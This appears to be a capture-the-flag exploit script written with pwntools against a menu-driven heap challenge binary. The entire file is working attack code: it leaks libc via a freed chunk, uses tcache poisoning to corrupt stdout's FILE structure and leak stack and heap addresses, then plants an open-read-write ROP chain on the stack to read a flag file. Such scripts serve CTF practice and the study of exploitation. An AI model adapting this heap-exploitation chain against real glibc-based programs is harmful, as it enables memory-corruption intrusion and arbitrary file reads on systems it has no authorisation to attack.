#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass
def cmd(choice):
	ru(b'Choice: ')
	sl(i2b(choice))
def add(size, data):
	cmd(1)
	ru(b'Please input size: \n')
	sl(i2b(size))
	ru(b'Please input content: \n')
	sn(data)
def delete(idx):
	cmd(2)
	ru(b'Please input idx: \n')
	sl(i2b(idx))
def show(idx):
	cmd(3)
	ru(b'Please input idx: \n')
	sl(i2b(idx))
def gift(idx):
	cmd(666)
	ru(b'Please input idx: \n')
	sl(i2b(idx))

vtable_off = 0x1e94a0
stdout_off = 0x1ed6a0
IO_base_off = 0x1ed723
environ_off = 0x1ef600
curbrk_off = 0x1ef620

for i in range(10):
	add(0x80, b"aaa")
add(0x80, b"./flag\x00\x00")
add(0x80, b"\n")
for i in range(7):
	delete(i)
gift(8)
show(8)
leak = uu64(ru(b"\nDone!", "drop"))
lg("leak")
libc_base = leak - 0x1ecbe0
lg("libc_base")
# debugPID()

delete(7)
add(0x80, b"aaa")
delete(8)
add(0x70, b"aaa")
add(0x98, p64(0) + p64(0x91) + p64(libc_base + stdout_off))		# 2
add(0x80, b"aaa")

debugPID()
add(0x88, p64(0xfbad1887) + p64(libc_base + IO_base_off)*3 + p64(libc_base + environ_off)*1 + p64(libc_base + curbrk_off + 0x08) *2)
stack_leak = uu64(rn(8))
rn(0x20 - 0x08)
heap_leak = uu64(rn(8))
lg("stack_leak")

pop_rdi_ret = 0x23b6a + libc_base
pop_rsi_ret = 0x2601f + libc_base
pop_rax_ret = 0x36174 + libc_base
pop_rdx_ret = 0x142c92 + libc_base
syscall_ret = 0x630a9 + libc_base
flag_addr = heap_leak - 0x207c0
buf__addr = heap_leak - 0x20730

orw0 = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rax_ret) + p64(2) + p64(syscall_ret) + p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buf__addr)
orw1 = p64(pop_rdx_ret) + p64(0x100) + p64(pop_rax_ret) + p64(0) + p64(syscall_ret) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buf__addr) + p64(pop_rdx_ret) + p64(0x100) + p64(libc_base + l.symbols["write"])
# lg("len(orw1 + orw2)")

delete(3)
delete(2)
add(0x98, p64(0) + p64(0x91) + p64(stack_leak - 0x150 + 0x68))
# add(0x98, p64(0) + p64(0x91) + p64(stack_leak - 0x150))
add(0x80, b"aaa")
add(0x88, orw1)

debugPID()

delete(3)
delete(2)
# add(0x98, p64(0) + p64(0x91) + p64(stack_leak))
add(0x98, p64(0) + p64(0x91) + p64(stack_leak - 0x150))
add(0x80, b"aaa")
debugPID()
add(0x88, b"A"*8 + p64(0xcafecafe) + orw0)

debugPID()
irt()
